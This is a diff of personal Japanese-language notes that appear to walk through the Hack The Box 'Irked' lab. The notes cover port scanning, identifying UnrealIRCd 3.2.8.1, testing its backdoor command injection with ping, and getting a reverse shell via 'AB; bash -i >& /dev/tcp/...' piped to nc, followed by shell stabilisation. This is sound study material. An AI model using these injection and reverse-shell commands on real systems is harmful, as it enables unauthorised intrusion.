@@ -180,3 +180,127 @@ PORT      STATE SERVICE
 
   
 
+```
+nc 10.10.10.117 8067
+:irked.htb NOTICE AUTH :*** Looking up your hostname...
+```
+
+```bash
+sudo vi /etc/hosts
+
+10.10.10.117    irked.htb
+```
+
+-p-がスキャンに時間がかかりすぎるが、以下で実施したら比較的早かった
+
+```bash
+sudo nmap -sS -n -vvv -p- 10.10.10.117
+```
+
+- -n : 名前解決を無視するオプション
+
+- -vvv：残りの時間を表示してくれる
+
+- -ss：ステルススキャン
+
+  →変にステルススキャンするよりもsTの方が早い時もある。
+
+* 1~5000, 5000 ~ 10000など分けてスキャンする
+
+```bash
+nc 10.10.10.117 6697
+PASS kali
+NICK kali
+USER kali Pleaseshow aaaaa :kali 
+
+:irked.htb 004 kali irked.htb Unreal3.2.8.1
+```
+
+```bash
+sudo tcpdump -i tun2 icmp
+```
+
+```bash
+echo "AB; ping -c 1 10.10.16.9" | nc 10.10.10.117 6697
+```
+
+→tcpdump側に以下応答あり。
+
+```bash
+22:45:14.874245 IP 10.10.16.9 > irked.htb: ICMP echo reply, id 4112, seq 1, length 64
+```
+
+```bash
+nc -lvnp 4444
+```
+
+```bash
+echo "AB; bash -i >& /dev/tcp/10.10.16.4/4444 0>&1" | nc 10.10.10.117 6697
+```
+
+```bash
+echo "AB; bash -c 'bash -i >& /dev/tcp/10.10.16.4/4444 0>&1'" | nc 10.10.10.117 6697
+```
+
+→nc上でバッシュを取得できた。
+
+```bash
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+* ptyライブラリをimportしてコード実行している
+* ptyモジュール：疑似端末ユーティリティ
+  https://docs.python.org/ja/3/library/pty.html
+  spawn(生成する)。どこかの端末の/bin/bashを生成し、操作可能にするということだろうか？入力と出力を自身のターミナルではなく、相手のターミナルに渡せる？？
+
+```bash
+# ctrl+zでncを一度抜ける
+stty raw -echo
+# fgでncに戻る
+```
+
+```bash
+# ポートの設定確認
+ssty -a
+
+-----
+speed 38400 baud; rows 50; columns 85; line = 0;
+intr = ^C; quit = ^\; erase = ^?; kill = ^U; eof = ^D; eol = <undef>; eol2 = <undef>;
+swtch = <undef>; start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W;
+lnext = ^V; discard = ^O; min = 1; time = 0;
+-parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts
+-ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl ixon -ixoff -iuclc
+-ixany -imaxbel iutf8
+opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0
+isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl
+echoke -flusho -extproc
+```
+
+* http://archive.linux.or.jp/JF/JFdocs/Serial-HOWTO-8.html
+
+* stty：シリアルポートの設定コマンド
+
+* raw：rawモードに設定。一時的な設定。
+
+* (-)echo：入力文字をエコーする
+
+* シリアルポート：**シリアルポート**とは、情報を（[パラレルポート](https://ja.wikipedia.org/wiki/パラレルポート)とは異なり）1度に1[ビット](https://ja.wikipedia.org/wiki/ビット)ずつ送受信する[シリアル通信](https://ja.wikipedia.org/wiki/シリアル通信)物理[インタフェース](https://ja.wikipedia.org/wiki/インタフェース_(情報技術))である。[パーソナルコンピュータ](https://ja.wikipedia.org/wiki/パーソナルコンピュータ)の歴史の大半において、データはシリアルポートを通じて[モデム](https://ja.wikipedia.org/wiki/モデム)、[端末](https://ja.wikipedia.org/wiki/端末)、その他様々な周辺装置の[デバイス](https://ja.wikipedia.org/wiki/デバイス)に伝送された。
+
+  ![image-20220729080924997](img/image-20220729080924997.png)
+
+```　bash
+ircd@irked:/home/djmardov/Documents$ ls -la
+total 16
+drwxr-xr-x  2 djmardov djmardov 4096 May 15  2018 .
+drwxr-xr-x 18 djmardov djmardov 4096 Nov  3  2018 ..
+-rw-r--r--  1 djmardov djmardov   52 May 16  2018 .backup
+-rw-------  1 djmardov djmardov   33 May 15  2018 user.txt
+ircd@irked:/home/djmardov/Documents$
+```
+
+```bash
+# at attack machine
+python -m http.server 5555
+```
+
+1
